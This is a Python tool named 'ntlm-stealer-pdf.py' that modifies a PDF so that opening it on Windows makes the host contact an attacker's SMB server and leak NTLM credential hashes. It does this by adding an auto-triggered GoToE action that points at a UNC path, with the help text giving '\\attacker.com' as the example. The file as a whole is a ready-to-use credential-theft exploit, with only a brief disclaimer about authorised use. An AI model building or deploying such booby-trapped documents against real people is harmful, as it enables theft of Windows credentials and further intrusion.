import argparse
from pdfrw import PdfReader, PdfWriter, PdfDict, PdfName


def parse_arguments():
    """
    Parse command-line arguments for the script.
    """
    parser = argparse.ArgumentParser(
        prog="ntlm-stealer-pdf.py",
        formatter_class=lambda prog: argparse.HelpFormatter(prog, max_help_position=50),
        description="Inject malicious metadata into a PDF file to force NTLM hash leakage "
                    "when the file is opened on a Windows host.",
        epilog="Use responsibly and only with explicit permission. Unauthorized use is illegal."
    )

    parser.add_argument(
        "input",
        help="Path to the input PDF file to be modified."
    )
    parser.add_argument(
        "unc_path",
        help="UNC path to the malicious SMB server (e.g., \\\\attacker.com\\fake_file.pdf)."
    )
    parser.add_argument(
        "-o", "--output",
        default="modified_file.pdf",
        help="Name of the output file. Default is 'modified_file.pdf'."
    )

    return parser.parse_args()


def inject_payload(input_pdf, output_pdf, unc_path):
    """
    Inject a malicious payload into the first page of a PDF file.

    Args:
        input_pdf (str): Path to the input PDF file.
        output_pdf (str): Path to save the modified PDF file.
        unc_path (str): UNC path to the malicious SMB server.
    """
    print(f"[*] Reading PDF file: {input_pdf}")
    reader = PdfReader(input_pdf)

    print("[*] Injecting malicious payload into the PDF file...")
    payload_action = PdfDict(
        O=PdfDict(
            F=unc_path,
            D=[0, PdfName('Fit')],
            S=PdfName('GoToE')
        )
    )

    # Ensure the Additional Actions (AA) field is initialized
    if not hasattr(reader.pages[0], "AA") or reader.pages[0].AA is None:
        reader.pages[0].AA = PdfDict()

    # Update the AA field with the payload
    reader.pages[0].AA.update(payload_action)

    print(f"[*] Saving modified PDF as: {output_pdf}")
    writer = PdfWriter()
    writer.addpages(reader.pages)
    writer.write(output_pdf)
    print("[*] Done!")


def main():
    """
    Main entry point for the script.
    """
    print(r"""
  _   _ _____ _     __  __   ____  _             _             ____  ____  _____ 
 | \ | |_   _| |   |  \/  | / ___|| |_ ___  __ _| | ___ _ __  |  _ \|  _ \|  ___|
 |  \| | | | | |   | |\/| | \___ \| __/ _ \/ _` | |/ _ \ '__| | |_) | | | | |_   
 | |\  | | | | |___| |  | |  ___) | ||  __/ (_| | |  __/ |    |  __/| |_| |  _|  
 |_| \_| |_| |_____|_|  |_| |____/ \__\___|\__,_|_|\___|_|    |_|   |____/|_|    
                                                                                
""")
    args = parse_arguments()
    inject_payload(args.input.strip(), args.output.strip(), args.unc_path.strip())


if __name__ == "__main__":
    main()
